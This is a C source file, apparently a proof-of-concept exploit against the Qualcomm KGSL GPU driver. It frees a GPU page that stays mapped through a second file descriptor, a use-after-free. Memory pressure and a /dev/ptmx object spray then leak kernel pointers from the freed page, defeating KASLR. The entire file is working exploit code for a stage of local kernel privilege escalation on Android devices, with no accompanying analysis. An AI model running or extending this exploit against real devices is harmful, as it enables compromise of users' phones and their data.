#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

struct gpumem_alloc_req {
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
};

int main() {
    printf("[*] Starting KGSL UAF Shrinker KASLR Leak test...\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd1 < 0) { perror("open fd1"); return 1; }

    struct gpumem_alloc_req req = {0};
    req.size = 0x1000;
    if (ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req) < 0) {
        perror("ioctl alloc");
        return 1;
    }
    printf("[+] Allocated UAF page at gpuaddr: 0x%lx\n", req.gpuaddr);

    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    uint64_t *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, req.gpuaddr);
    if (ptr2 == MAP_FAILED) { perror("mmap fd2"); return 1; }

    ptr2[0] = 0x1122334455667788ULL;

    printf("[*] Closing fd1 to put physical page into kgsl_page_pool...\n");
    close(fd1);

    printf("[*] Triggering system memory pressure to force kgsl_pool_shrinker...\n");
    
    // We will allocate memory and spray PTMX at the same time
    int max_ptmx = 3000;
    int *ptmx_fds = malloc(max_ptmx * sizeof(int));
    int ptmx_count = 0;
    
    // Allocate useless memory to cause pressure
    int max_chunks = 200; // 200 * 10MB = 2GB, might trigger OOM, we will stop if we find ptr
    void **pressure = malloc(max_chunks * sizeof(void*));

    for (int i = 0; i < max_chunks; i++) {
        // Allocate 10MB
        pressure[i] = mmap(NULL, 10 * 1024 * 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (pressure[i] == MAP_FAILED) break;
        
        // Touch memory to ensure it's actually resident (faulted in)
        memset(pressure[i], 0x41, 10 * 1024 * 1024);
        
        // Spray some kernel objects alongside
        for (int j = 0; j < 20; j++) {
            if (ptmx_count < max_ptmx) {
                int pfd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                if (pfd >= 0) {
                    ptmx_fds[ptmx_count++] = pfd;
                }
            }
        }

        // Check if our UAF page changed
        int found = 0;
        for (int k = 0; k < 512; k++) {
            uint64_t val = ptr2[k];
            // Look for typical kernel pointer range (ffffffxxxxxxxxx)
            if ((val & 0xffffff0000000000ULL) == 0xffffff8000000000ULL || (val & 0xffffff0000000000ULL) == 0xffffffc000000000ULL || (val & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                if (val > 0xffffff0000000000ULL) {
                    printf("\n[!!!] KASLR LEAK FOUND at offset 0x%x (pressure %d0MB):\n", k * 8, i + 1);
                    printf("      Pointer: 0x%016lx\n", val);
                    found = 1;
                }
            }
        }
        
        if (found) {
            printf("[+] Shrinker successfully returned page to Buddy, and SLAB reclaimed it!\n");
            return 0; // Success
        }
        
        if (i % 10 == 0) {
            printf("[.] Pressure: %d0 MB allocated...\n", i);
        }
    }

    printf("[-] Failed to find kernel pointers. The page didn't become a SLAB object.\n");
    return 0;
}
